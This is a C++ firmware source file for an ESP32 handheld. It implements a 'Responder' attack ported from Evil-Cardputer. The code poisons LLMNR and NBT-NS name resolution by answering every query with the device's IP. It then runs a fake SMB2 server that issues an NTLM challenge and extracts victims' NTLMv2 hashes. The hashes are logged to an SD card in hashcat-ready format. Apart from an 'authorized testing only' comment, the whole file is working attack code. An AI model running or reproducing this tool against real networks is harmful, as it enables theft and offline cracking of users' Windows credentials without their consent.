/*
 * SaltyJack — Responder (LLMNR + NBT-NS + SMB NTLMv2 harvester).
 *
 * Direct port of @7h30th3r0n3's Responder module from Evil-Cardputer
 * (Evil-M5Project). Logic, protocol handling, and NTLMSSP state machine
 * are lifted from his source with minimal restructuring. All credit.
 *
 * What it does:
 *   - Listens on UDP 137 (NBT-NS) and UDP 5355 (LLMNR, multicast
 *     224.0.0.252) for name-resolution queries. Answers every query
 *     with OUR IP, poisoning the cache.
 *   - Poisoned victim tries SMB to our IP on TCP 445.
 *   - We run a partial SMB2 negotiate → Session Setup dance, sending
 *     NTLMSSP Type-2 (challenge), then extract the Type-3 hash when
 *     the victim authenticates.
 *   - Hash written to SD at /poseidon/saltyjack/ntlm_hashes.txt in
 *     hashcat-ready format (user::domain:challenge:proof:blob).
 *
 * AUTHORIZED TESTING ONLY. Works on any L2 lwIP is attached to — WiFi
 * STA (device joined target WiFi) or W5500 Ethernet when that hat lands.
 */
#include "../../app.h"
#include "../../ui.h"
#include "../../input.h"
#include "../../radio.h"
#include "saltyjack.h"
#include "saltyjack_style.h"
#include <WiFi.h>
#include <WiFiUdp.h>
#include <WiFiServer.h>
#include <WiFiClient.h>
#include <SD.h>
#include <esp_random.h>
#include <sys/time.h>

/* ===== config ===== */

#define LLMNR_PORT   5355
#define NBNS_PORT    137
#define SMB_PORT     445
#define HASH_LOG_PATH  "/poseidon/saltyjack/ntlm_hashes.txt"
#define NETBIOS_NAME   "POSEIDON-SJ"
#define NETBIOS_DOMAIN "SALTYJACK"
#define DNS_DOMAIN     "saltyjack.lan"

/* ===== state ===== */

static WiFiUDP    s_llmnr_udp;
static WiFiUDP    s_nbns_udp;
static WiFiServer s_smb_server(SMB_PORT);

struct smb_state_t {
    WiFiClient client;
    bool       active;
    uint64_t   session_id;
    uint8_t    challenge[8];
};
static smb_state_t s_smb = {};

static uint32_t s_nbns_ct = 0;
static uint32_t s_llmnr_ct = 0;
static uint32_t s_smb_conn_ct = 0;
static uint32_t s_hash_ct = 0;
static char     s_last_query[48] = "";
static char     s_last_user[40] = "";
static char     s_last_domain[40] = "";
static char     s_last_workstation[40] = "";

/* ===== helpers ===== */

static IPAddress our_ip(void)
{
    if (WiFi.status() == WL_CONNECTED) return WiFi.localIP();
    return WiFi.softAPIP();
}

static uint64_t windows_timestamp(void)
{
    const uint64_t EPOCH_DIFF = 11644473600ULL;
    struct timeval tv;
    gettimeofday(&tv, NULL);
    return ((tv.tv_sec + EPOCH_DIFF) * 10000000ULL + (tv.tv_usec * 10ULL));
}

/* Decode a NetBIOS-compressed label (32 ASCII nibbles → 16 byte name).
 * Same algorithm as Evil-Cardputer's decodeNetBIOSLabel. */
static void decode_nb_label(const uint8_t *in, char *out, size_t cap)
{
    size_t j = 0;
    for (int i = 0; i < 16 && j + 1 < cap; ++i) {
        char c = ((in[i * 2] - 'A') << 4) | (in[i * 2 + 1] - 'A');
        if (c == ' ' || c == 0) break;
        out[j++] = c;
    }
    out[j] = '\0';
}

/* ===== NTLM Type-2 challenge builder ===== */
/* Direct lift from Evil-Cardputer buildNTLMType2Msg. */
static void build_ntlm_type2(const uint8_t challenge[8], uint8_t *buffer, uint16_t *out_len)
{
    uint8_t av_pairs[512];
    int offset = 0;

    auto append_av = [&](uint16_t type, const char *data) {
        int l = strlen(data);
        av_pairs[offset++] = type & 0xFF;
        av_pairs[offset++] = (type >> 8) & 0xFF;
        av_pairs[offset++] = (l * 2) & 0xFF;
        av_pairs[offset++] = ((l * 2) >> 8) & 0xFF;
        for (int i = 0; i < l; i++) {
            av_pairs[offset++] = data[i];
            av_pairs[offset++] = 0x00;
        }
    };

    append_av(0x0001, NETBIOS_NAME);    /* NetBIOS computer name */
    append_av(0x0002, NETBIOS_DOMAIN);  /* NetBIOS domain */
    append_av(0x0003, NETBIOS_NAME);    /* DNS computer name */
    append_av(0x0004, DNS_DOMAIN);      /* DNS domain */
    append_av(0x0005, DNS_DOMAIN);      /* DNS tree */

    /* Timestamp AV pair */
    av_pairs[offset++] = 0x07; av_pairs[offset++] = 0x00;
    av_pairs[offset++] = 0x08; av_pairs[offset++] = 0x00;
    uint64_t ts = windows_timestamp();
    memcpy(av_pairs + offset, &ts, 8);
    offset += 8;

    /* End of AV pairs */
    av_pairs[offset++] = 0x00; av_pairs[offset++] = 0x00;
    av_pairs[offset++] = 0x00; av_pairs[offset++] = 0x00;

    const int NTLM_HEADER_SIZE = 48;
    memcpy(buffer, "NTLMSSP\0", 8);
    buffer[8] = 0x02; buffer[9] = 0x00;   /* Type 2 */
    buffer[10] = buffer[11] = 0x00;

    uint16_t target_len = strlen(NETBIOS_NAME) * 2;
    buffer[12] = target_len & 0xFF;
    buffer[13] = (target_len >> 8) & 0xFF;
    buffer[14] = buffer[12];
    buffer[15] = buffer[13];
    *(uint32_t *)(buffer + 16) = NTLM_HEADER_SIZE;

    *(uint32_t *)(buffer + 20) = 0xE2898215;   /* standard NTLMv2 flags */

    memcpy(buffer + 24, challenge, 8);
    memset(buffer + 32, 0, 8);

    uint16_t av_len = offset;
    *(uint16_t *)(buffer + 40) = av_len;
    *(uint16_t *)(buffer + 42) = av_len;
    *(uint32_t *)(buffer + 44) = NTLM_HEADER_SIZE + target_len;

    /* Target name (NetBIOS name as UTF-16LE) */
    int p = NTLM_HEADER_SIZE;
    const char *n = NETBIOS_NAME;
    while (*n) {
        buffer[p++] = *n++;
        buffer[p++] = 0x00;
    }

    /* AV pairs */
    memcpy(buffer + p, av_pairs, av_len);
    p += av_len;

    *out_len = p;
}

/* ===== NTLM Type-3 hash extractor ===== */
/* Lifted from Evil-Cardputer extractAndPrintHash. */
static void extract_hash(const uint8_t *pkt, uint32_t pkt_len, const uint8_t *ntlm)
{
    auto le16 = [](const uint8_t *p) -> uint16_t {
        return p[0] | (p[1] << 8);
    };
    auto le32 = [](const uint8_t *p) -> uint32_t {
        return p[0] | (p[1] << 8) | (p[2] << 16) | (p[3] << 24);
    };

    uint32_t base = ntlm - pkt;
    uint16_t nt_resp_len  = le16(ntlm + 20);
    uint32_t nt_resp_off  = le32(ntlm + 24);
    uint16_t dom_len      = le16(ntlm + 28);
    uint32_t dom_off      = le32(ntlm + 32);
    uint16_t user_len     = le16(ntlm + 36);
    uint32_t user_off     = le32(ntlm + 40);
    uint16_t ws_len       = le16(ntlm + 44);
    uint32_t ws_off       = le32(ntlm + 48);

    auto read_utf16 = [&](uint32_t off, uint16_t len, char *out, size_t cap) {
        size_t j = 0;
        if (base + off + len > pkt_len) { out[0] = '\0'; return; }
        for (uint16_t i = 0; i < len && j + 1 < cap; i += 2) {
            out[j++] = (char)pkt[base + off + i];
        }
        out[j] = '\0';
    };

    char domain[40], username[40], workstation[40];
    read_utf16(dom_off,  dom_len,  domain,      sizeof(domain));
    read_utf16(user_off, user_len, username,    sizeof(username));
    read_utf16(ws_off,   ws_len,   workstation, sizeof(workstation));

    /* Server challenge as hex */
    char chall_hex[17];
    for (int i = 0; i < 8; ++i) {
        sprintf(chall_hex + 2 * i, "%02X", s_smb.challenge[i]);
    }
    chall_hex[16] = '\0';

    /* Full NTLMv2 response as hex. `nt_resp_len` is attacker-supplied (uint16),
     * so cap before allocating — a 131KB malloc will fail on a no-PSRAM S3. */
    if (nt_resp_len == 0 || nt_resp_len > 1024) return;
    char *nt_hex = (char *)malloc((size_t)nt_resp_len * 2 + 1);
    if (!nt_hex) return;
    for (uint16_t i = 0; i < nt_resp_len; ++i) {
        sprintf(nt_hex + 2 * i, "%02X", pkt[base + nt_resp_off + i]);
    }
    nt_hex[nt_resp_len * 2] = '\0';

    /* First 32 hex = nt_proof, rest = blob */
    char nt_proof[33];
    strncpy(nt_proof, nt_hex, 32);
    nt_proof[32] = '\0';
    const char *blob = nt_hex + 32;

    /* Hashcat format: user::domain:challenge:proof:blob */
    char line[2048];
    snprintf(line, sizeof(line), "%s::%s:%s:%s:%s",
             username, domain, chall_hex, nt_proof, blob);

    Serial.println("---- SaltyJack NTLMv2 capture ----");
    Serial.println(line);
    Serial.println("----------------------------------");

    /* Write to SD */
    SD.mkdir("/poseidon");
    SD.mkdir("/poseidon/saltyjack");
    File f = SD.open(HASH_LOG_PATH, FILE_APPEND);
    if (f) {
        f.print("# ");
        f.print(workstation);
        f.println();
        f.println(line);
        f.close();
    }

    strncpy(s_last_user,        username,    sizeof(s_last_user));
    strncpy(s_last_domain,      domain,      sizeof(s_last_domain));
    strncpy(s_last_workstation, workstation, sizeof(s_last_workstation));
    s_hash_ct++;

    free(nt_hex);
}

/* ===== LLMNR handler ===== */

static void handle_llmnr(void)
{
    int ps = s_llmnr_udp.parsePacket();
    if (ps <= 0) return;
    uint8_t buf[300];
    int len = s_llmnr_udp.read(buf, sizeof(buf));
    if (len < 12) return;

    uint16_t flags    = (buf[2] << 8) | buf[3];
    uint16_t qd_count = (buf[4] << 8) | buf[5];
    uint16_t an_count = (buf[6] << 8) | buf[7];
    if ((flags & 0x8000) || qd_count == 0 || an_count != 0) return;

    uint8_t name_len = buf[12];
    if (name_len == 0 || name_len >= 64 || 13 + name_len + 4 > len) return;
    if (buf[13 + name_len] != 0x00) return;

    const uint8_t *qtype_p = buf + 13 + name_len + 1;
    uint16_t qtype  = (qtype_p[0] << 8) | qtype_p[1];
    uint16_t qclass = (qtype_p[2] << 8) | qtype_p[3];
    if (qclass != 0x0001) return;
    bool is_a    = (qtype == 0x0001);
    bool is_aaaa = (qtype == 0x001C);
    if (!is_a && !is_aaaa) return;

    /* Log the query name */
    if (name_len < (int)sizeof(s_last_query)) {
        memcpy(s_last_query, buf + 13, name_len);
        s_last_query[name_len] = '\0';
    }
    s_llmnr_ct++;

    uint16_t question_len = 1 + name_len + 1 + 2 + 2;
    uint8_t resp[350];
    resp[0] = buf[0]; resp[1] = buf[1];   /* Transaction ID */
    resp[2] = 0x84; resp[3] = 0x00;        /* QR=1 | AA=1 */
    resp[4] = 0x00; resp[5] = 0x01;        /* QDcount=1 */
    resp[6] = 0x00; resp[7] = 0x01;        /* ANcount=1 */
    resp[8] = resp[9] = 0x00;
    resp[10] = resp[11] = 0x00;
    memcpy(resp + 12, buf + 12, question_len);

    uint16_t ans_off = 12 + question_len;
    resp[ans_off + 0] = 0xC0; resp[ans_off + 1] = 0x0C;    /* name ptr */
    resp[ans_off + 2] = qtype_p[0]; resp[ans_off + 3] = qtype_p[1];
    resp[ans_off + 4] = 0x00; resp[ans_off + 5] = 0x01;    /* CLASS IN */
    resp[ans_off + 6] = 0x00; resp[ans_off + 7] = 0x00;    /* TTL = 30s */
    resp[ans_off + 8] = 0x00; resp[ans_off + 9] = 0x1E;

    IPAddress ip = our_ip();
    int total;
    if (is_a) {
        resp[ans_off + 10] = 0x00; resp[ans_off + 11] = 0x04;
        resp[ans_off + 12] = ip[0]; resp[ans_off + 13] = ip[1];
        resp[ans_off + 14] = ip[2]; resp[ans_off + 15] = ip[3];
        total = ans_off + 16;
    } else {
        resp[ans_off + 10] = 0x00; resp[ans_off + 11] = 0x10;
        memset(resp + ans_off + 12, 0, 10);
        resp[ans_off + 22] = 0xFF; resp[ans_off + 23] = 0xFF;
        resp[ans_off + 24] = ip[0]; resp[ans_off + 25] = ip[1];
        resp[ans_off + 26] = ip[2]; resp[ans_off + 27] = ip[3];
        total = ans_off + 28;
    }

    s_llmnr_udp.beginPacket(s_llmnr_udp.remoteIP(), s_llmnr_udp.remotePort());
    s_llmnr_udp.write(resp, total);
    s_llmnr_udp.endPacket();
}

/* ===== NBNS handler ===== */

static void handle_nbns(void)
{
    int ps = s_nbns_udp.parsePacket();
    if (ps <= 0) return;
    uint8_t buf[100];
    int len = s_nbns_udp.read(buf, sizeof(buf));
    if (len < 50) return;

    uint16_t flags  = (buf[2] << 8) | buf[3];
    uint16_t qd     = (buf[4] << 8) | buf[5];
    uint16_t qtype  = (buf[len - 4] << 8) | buf[len - 3];
    uint16_t qclass = (buf[len - 2] << 8) | buf[len - 1];
    if ((flags & 0x8000) || qd < 1 || qtype != 0x0020 || qclass != 0x0001) return;
    if (buf[12] != 0x20) return;

    char name[40];
    decode_nb_label(buf + 13, name, sizeof(name));
    strncpy(s_last_query, name, sizeof(s_last_query));
    s_last_query[sizeof(s_last_query) - 1] = '\0';
    s_nbns_ct++;

    uint8_t resp[80];
    resp[0] = buf[0]; resp[1] = buf[1];
    resp[2] = 0x84; resp[3] = 0x00;
    resp[4] = resp[5] = 0x00;
    resp[6] = 0x00; resp[7] = 0x01;
    resp[8] = resp[9] = 0x00;
    resp[10] = resp[11] = 0x00;
    memcpy(resp + 12, buf + 12, 34);
    resp[46] = 0x00; resp[47] = 0x20;  /* Type NB */
    resp[48] = 0x00; resp[49] = 0x01;  /* Class IN */
    resp[50] = 0x00; resp[51] = 0x00; resp[52] = 0x00; resp[53] = 0x3C;  /* TTL 60 */
    resp[54] = 0x00; resp[55] = 0x06;  /* data len */
    resp[56] = 0x00; resp[57] = 0x00;  /* NB flags */
    IPAddress ip = our_ip();
    resp[58] = ip[0]; resp[59] = ip[1]; resp[60] = ip[2]; resp[61] = ip[3];

    s_nbns_udp.beginPacket(s_nbns_udp.remoteIP(), s_nbns_udp.remotePort());
    s_nbns_udp.write(resp, 62);
    s_nbns_udp.endPacket();
}

/* ===== SMB2 state machine ===== */
/* Simplified from Evil-Cardputer — only handles SMB2 negotiate +
 * SessionSetup (NTLMSSP Type-1 → Type-2 → Type-3). If the client tries
 * to speak SMB1 dialect it won't get an answer and will give up. */

static void smb_send_negotiate_response(const uint8_t *pkt)
{
    uint8_t resp[140] = {0};
    resp[0] = 0x00;
    memcpy(resp + 4, pkt, 64);

    resp[4 + 16] = pkt[16] | 0x01;          /* ServerToRedir */
    *(uint32_t *)(resp + 4 + 8) = 0x00000000;

    resp[4 + 14] = pkt[14] ? pkt[14] : 0x01;
    resp[4 + 15] = pkt[15];
    memset(resp + 4 + 40, 0, 8);

    /* Negotiate response body */
    resp[4 + 64] = 0x41; resp[4 + 65] = 0x00;       /* StructureSize */
    resp[4 + 66] = 0x01; resp[4 + 67] = 0x00;       /* SecurityMode: signing enabled */
    resp[4 + 68] = 0x10; resp[4 + 69] = 0x02;       /* Dialect = 0x0210 */
    resp[4 + 70] = resp[4 + 71] = 0x00;             /* Reserved */

    uint8_t mac[6];
    WiFi.macAddress(mac);
    memcpy(resp + 4 + 72, mac, 6);                  /* Server GUID uses MAC */
    memset(resp + 4 + 78, 0, 10);

    *(uint32_t *)(resp + 4 + 88)  = 0x00000000;     /* Capabilities */
    *(uint32_t *)(resp + 4 + 92)  = 0x00010000;     /* MaxTransact */
    *(uint32_t *)(resp + 4 + 96)  = 0x00010000;     /* MaxRead */
    *(uint32_t *)(resp + 4 + 100) = 0x00010000;     /* MaxWrite */
    memset(resp + 4 + 104, 0, 16);                  /* SystemTime + BootTime */
    resp[4 + 120] = resp[4 + 121] = 0;              /* SecBufferOffset */
    resp[4 + 122] = resp[4 + 123] = 0;              /* SecBufferLength */

    uint32_t smb_len = 64 + 65;
    resp[1] = (smb_len >> 16) & 0xFF;
    resp[2] = (smb_len >>  8) & 0xFF;
    resp[3] =  smb_len        & 0xFF;

    s_smb.client.write(resp, 4 + smb_len);
}

static void smb_send_session_setup_challenge(const uint8_t *pkt)
{
    uint8_t ntlm_buf[512];
    uint16_t ntlm_len = 0;
    for (int i = 0; i < 8; ++i) {
        s_smb.challenge[i] = (uint8_t)(esp_random() & 0xFF);
    }
    build_ntlm_type2(s_smb.challenge, ntlm_buf, &ntlm_len);

    s_smb.session_id = ((uint64_t)esp_random() << 32) | esp_random();
    if (s_smb.session_id == 0) s_smb.session_id = 1;

    uint8_t resp[600] = {0};
    resp[0] = 0x00;
    memcpy(resp + 4, pkt, 64);
    resp[4 + 16] = pkt[16] | 0x01;
    *(uint32_t *)(resp + 4 + 8) = 0xC0000016;       /* MORE_PROCESSING_REQUIRED */
    resp[4 + 14] = pkt[14]; resp[4 + 15] = pkt[15];
    *(uint64_t *)(resp + 4 + 40) = s_smb.session_id;

    resp[4 + 64] = 0x09; resp[4 + 65] = 0x00;       /* StructureSize */
    resp[4 + 66] = 0x00; resp[4 + 67] = 0x00;
    *(uint16_t *)(resp + 4 + 68) = 0x48;            /* SecBufferOffset = 72 */
    *(uint16_t *)(resp + 4 + 70) = ntlm_len;
    memcpy(resp + 4 + 72, ntlm_buf, ntlm_len);

    uint32_t smb_len = 64 + 9 + ntlm_len;
    resp[1] = (smb_len >> 16) & 0xFF;
    resp[2] = (smb_len >>  8) & 0xFF;
    resp[3] =  smb_len        & 0xFF;
    s_smb.client.write(resp, 4 + smb_len);
}

static void handle_smb_packet(const uint8_t *pkt, uint32_t pkt_len)
{
    /* Expect SMB2 signature: 0xFE 'S' 'M' 'B' */
    if (pkt_len < 64 || pkt[0] != 0xFE || pkt[1] != 'S' || pkt[2] != 'M' || pkt[3] != 'B') {
        return;
    }
    uint16_t command = pkt[12] | (pkt[13] << 8);

    if (command == 0x0000) {
        smb_send_negotiate_response(pkt);
    } else if (command == 0x0001) {
        /* Session Setup: find NTLMSSP blob */
        int ntlm_idx = -1;
        for (uint32_t i = 0; i + 7 < pkt_len; ++i) {
            if (memcmp(pkt + i, "NTLMSSP", 7) == 0) { ntlm_idx = i; break; }
        }
        if (ntlm_idx < 0 || (uint32_t)ntlm_idx + 8 >= pkt_len) return;
        uint8_t type = pkt[ntlm_idx + 8];
        if (type == 1) {
            smb_send_session_setup_challenge(pkt);
        } else if (type == 3) {
            extract_hash(pkt, pkt_len, pkt + ntlm_idx);
            s_smb.client.stop();
            s_smb.active = false;
        }
    }
}

static void handle_smb(void)
{
    if (!s_smb.active) {
        WiFiClient nc = s_smb_server.available();
        if (nc) {
            s_smb.client = nc;
            s_smb.active = true;
            s_smb.session_id = 0;
            s_smb_conn_ct++;
        }
        return;
    }

    if (!s_smb.client.connected()) {
        s_smb.active = false;
        return;
    }
    s_smb.client.setTimeout(100);
    if (s_smb.client.available() < 4) return;

    uint8_t nbss[4];
    if (s_smb.client.read(nbss, 4) != 4) return;
    uint32_t smb_len = ((uint32_t)nbss[1] << 16) | ((uint32_t)nbss[2] << 8) | nbss[3];
    if (smb_len == 0 || smb_len > 4096) return;

    uint8_t *pkt = (uint8_t *)malloc(smb_len);
    if (!pkt) { s_smb.client.stop(); s_smb.active = false; return; }
    int rd = 0;
    uint32_t start = millis();
    while (rd < (int)smb_len && millis() - start < 500) {
        int n = s_smb.client.read(pkt + rd, smb_len - rd);
        if (n > 0) rd += n;
        else delay(5);
    }
    if (rd == (int)smb_len) {
        handle_smb_packet(pkt, smb_len);
    } else {
        /* Partial read — the client's packet is still streaming or the TCP
         * buffer has stale bytes from a previous torn read. Drop the whole
         * session rather than risk misparsing the next NBT header from
         * mid-packet garbage on the next call. */
        s_smb.client.stop();
        s_smb.active = false;
    }
    free(pkt);
}

/* ===== feature entry ===== */

void feat_saltyjack_responder(void)
{
    radio_switch(RADIO_WIFI);
    if (WiFi.status() != WL_CONNECTED) {
        auto &d = M5Cardputer.Display;
        sj_frame("RESPONDER");
        d.setTextColor(SJ_BAD, SJ_BG);
        d.setCursor(SJ_CONTENT_X, BODY_Y + 24); d.print("Not connected.");
        d.setTextColor(SJ_FG, SJ_BG);
        d.setCursor(SJ_CONTENT_X, BODY_Y + 38); d.print("Join target WiFi first");
        d.setCursor(SJ_CONTENT_X, BODY_Y + 48); d.print("via System > Connect.");
        sj_footer("`=back");
        while (input_poll() == PK_NONE) delay(30);
        return;
    }

    /* Bind listeners */
    bool ok_nbns  = s_nbns_udp.begin(NBNS_PORT);
    bool ok_llmnr = s_llmnr_udp.beginMulticast(IPAddress(224, 0, 0, 252), LLMNR_PORT);
    s_smb_server.begin();
    s_smb.active = false;

    s_nbns_ct = s_llmnr_ct = s_smb_conn_ct = s_hash_ct = 0;
    s_last_query[0] = '\0';
    s_last_user[0] = s_last_domain[0] = s_last_workstation[0] = '\0';

    if (!ok_nbns || !ok_llmnr) {
        ui_toast("listener bind failed", 0xFB4A, 1500);
        s_nbns_udp.stop();
        s_llmnr_udp.stop();
        s_smb_server.end();
        return;
    }

    auto &d = M5Cardputer.Display;
    sj_frame("RESPONDER");

    uint32_t last_draw = 0;
    while (true) {
        handle_llmnr();
        handle_nbns();
        handle_smb();

        if (millis() - last_draw > 250) {
            last_draw = millis();
            sj_frame("RESPONDER");

            /* IP line, info-style */
            d.setTextColor(SJ_FG_DIM, SJ_BG);
            d.setCursor(SJ_CONTENT_X, SJ_CONTENT_Y);
            d.print("ip ");
            d.setTextColor(SJ_ACCENT, SJ_BG);
            d.print(our_ip().toString().c_str());

            /* Counters */
            sj_row             (SJ_CONTENT_Y + 11, "llmnr   ", s_llmnr_ct);
            sj_row             (SJ_CONTENT_Y + 20, "nbns    ", s_nbns_ct);
            sj_row             (SJ_CONTENT_Y + 29, "smb conn", s_smb_conn_ct);
            sj_row_highlight   (SJ_CONTENT_Y + 38, "HASHES  ", s_hash_ct);

            /* Last capture in a labeled info box */
            if (s_last_user[0]) {
                int by = SJ_CONTENT_Y + 55;
                sj_info_box(SJ_FRAME_X + 4, by, SJ_FRAME_W - 8, 28, "LAST CAPTURE");
                char ud[48];
                snprintf(ud, sizeof(ud), "%.18s\\%.12s", s_last_domain, s_last_user);
                sj_info_row(SJ_FRAME_X + 4, by, 0, "user", ud);
                sj_info_row(SJ_FRAME_X + 4, by, 1, "ws  ", s_last_workstation);
            } else if (s_last_query[0]) {
                sj_print_info(SJ_CONTENT_Y + 58, "waiting for auth...");
                d.setTextColor(SJ_FG_DIM, SJ_BG);
                d.setCursor(SJ_CONTENT_X, SJ_CONTENT_Y + 68);
                d.printf("q: %.22s", s_last_query);
            } else {
                sj_print_info(SJ_CONTENT_Y + 58, "listening on LAN");
            }

            sj_footer("`=stop");
        }

        uint16_t k = input_poll();
        if (k == PK_ESC) break;
        if (k == PK_NONE) delay(5);
    }

    s_nbns_udp.stop();
    s_llmnr_udp.stop();
    s_smb_server.end();
    if (s_smb.client) s_smb.client.stop();
    s_smb.active = false;
}
